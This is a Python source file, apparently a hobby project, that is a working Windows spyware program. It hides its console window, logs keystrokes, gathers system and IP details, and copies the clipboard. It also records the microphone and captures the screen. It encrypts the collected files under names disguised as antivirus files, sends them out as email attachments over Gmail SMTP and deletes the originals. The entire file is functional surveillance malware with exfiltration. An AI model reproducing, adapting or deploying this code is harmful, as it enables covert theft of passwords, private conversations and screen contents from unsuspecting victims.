import time
import os
import win32gui, win32con

# Hides the windows command window after running
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

# To grab copied content
import win32clipboard

# Libraries for email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# Library for SMTP email protocol
import smtplib

# Allows us to gather information about the system
import socket
import platform

# To log keys
from pynput.keyboard import Key
from pynput.keyboard import Listener

# To record with microphone
from scipy.io.wavfile import write
import sounddevice as sd

# To encrypt files using Cryptography
from cryptography.fernet import Fernet

import getpass
from requests import get

# To screenshot using Pillow
from PIL import ImageGrab

CWD = os.getcwd() + "\\"
ADDRESS = ""
PASSWORD = ""

# Names of files before they're encrypted
keyFile = "output.txt"
sysInfoFile = "sysinfo.txt"
clipboardFile = "clipboard.txt"
audioFile = "micrecording.wav"
imgFile = "screenshot.png"

# Names of files after they're encrypted (obfuscated)
keyFileEnc = "WatchDogAntivirus.txt"
sysInfoFileEnc = "WatchDogAntivirusDrivers.txt"
clipboardFileEnc = "WatchDogAntivirusSignatureDatabase.txt"
audioFileEnc = "WatchDogAntivirusAlert.wav"
imgFileEnc = "WatchDogAntivirusLogo.png"

encryptList = [keyFile, sysInfoFile, clipboardFile, audioFile, imgFile]
encryptedList = [keyFileEnc, sysInfoFileEnc, clipboardFileEnc, audioFileEnc, imgFileEnc]

iteration = 0
totalIterations = 1
curTime = time.time()
stopTime = time.time() + 5 # seconds


keyList = []
# Append key to list and keep count
def onPress(key):
    global keyList, curTime
    curTime = time.time()
    #print(key)
    keyList.append(key)
    fileOutput(keyList)
    keyList = []

# Exit Keylogger
def onRelease(key):
    if (key == Key.esc) or (curTime > stopTime):
        return False

# Appends keys from list to file
# Removes "Key.esc" and "Key.shift", replaces "Key.space" with a space
i = 0
def fileOutput(keyList):
    global i
    file = open(keyFile,"a")
    for key in keyList:
        i += 1
        key = str(key).replace("'","")
        if len(key) > 1:
            if key == "Key.space":
                key = " "
            elif key == "Key.esc" or key == "Key.shift":
                key = ""
            else:
                key = key + " "
        if(key.find(" ") > 0 and i >= 5): # double check for "space" in output
            file.write("\n")
            i = 0
        else:
            file.write(key)
    file.close()

# Sends email with file attachment using SMTP protocol
def email(fileName, attachment, address):
    message = MIMEMultipart()
    message["From"] = ADDRESS
    message["To"] = address
    message["Subject"] = "Keys Logged"
    body = "Email Body"
    mimeText = MIMEText(body, "plain")
    message.attach(mimeText)
    attachment = open(attachment, "rb")

    mimeBase = MIMEBase("application", "octet-stream")
    mimeBase.set_payload((attachment).read())
    encoders.encode_base64(mimeBase)
    mimeBase.add_header("Content-Disposition", "attachment; fileName= %s" %fileName)

    message.attach(mimeBase)
    messageToString = message.as_string()

    # e-mail server and port number
    smtp = smtplib.SMTP("smtp.gmail.com", 587)
    #starts tls session
    smtp.starttls()
    smtp.login(ADDRESS, PASSWORD)
    smtp.sendmail(ADDRESS, address, messageToString)
    smtp.quit()

# Grabs various system information
def sysInfo():
    file = open(sysInfoFile, "a")
    hostName = socket.gethostname()
    IP = socket.gethostbyname(hostName)
    try:
        # Uses requests get function
        publicIP = get("https://api.ipify.org").text
        file.write("Public IP Address: " + publicIP + "\n")
    except Exception as e:
        file.write("Couldn't get Public IP Address; max query limit \n")
        file.write(str(e) + "\n")
    file.write("Private IP Address: " + IP + "\n")
    file.write("Host Name: " + hostName + "\n")
    file.write("Processor: " + platform.processor() + "\n")
    file.write("System: " + platform.system() + " " + platform.version() + "\n")
    file.write("Machine: " + platform.machine() + "\n")
    file.close()
sysInfo()

# Attempts to copy clipboard contents (only works with text)
def clipboard():
    file = open(clipboardFile, "a")
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        file.write("Clipboard Data: \n" + data)
        file.close()
    except Exception as e:
        file.write("Clipboard could not be copied: \n" + str(e) + "\n")
        file.close()

# Records microphone input for 5s
def mic():
    Hz = 44100
    time = 5 # seconds
    recording = sd.rec(int(time*Hz), samplerate=Hz, channels=2)
    sd.wait()
    write(audioFile, Hz, recording)

#Takes a screenshot of user's screen
def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(imgFile)

with Listener(on_press=onPress, on_release=onRelease) as keyListener:
    keyListener.join()
    
while iteration < totalIterations:
    curTime = time.time()
    if curTime > stopTime:
        newFile = open(keyFile, "a")
        newFile.write("\n\n")
        newFile.close()
        screenshot()
        clipboard()
        mic()
        iteration += 1
        curTime = time.time()
        stopTime = time.time() + 5

key = "DO2q26e2xa_XDjAza5NtD-5Ok1GjwPJLKBzia31TIDk=" # generated via KeyGen.py
i=0
# Opens every file that needs to be encrypted, encrypts data with key, writes to new file, and emails it
# Then removes old files from system
for element in encryptList:
    file = open(element, "rb") # read binary
    data = file.read()
    file.close()
    fernet = Fernet(key)
    dataEnc = fernet.encrypt(data)
    fileEnc = open(encryptedList[i], "wb") # write binary
    fileEnc.write(dataEnc)
    fileEnc.close()
    email(encryptedList[i], encryptedList[i], ADDRESS)
    os.remove(element)
    i+=1


#email(keyFile, CWD+keyFile, ADDRESS)
#sysInfo()
#clipboard()
#mic()
#screenshot()
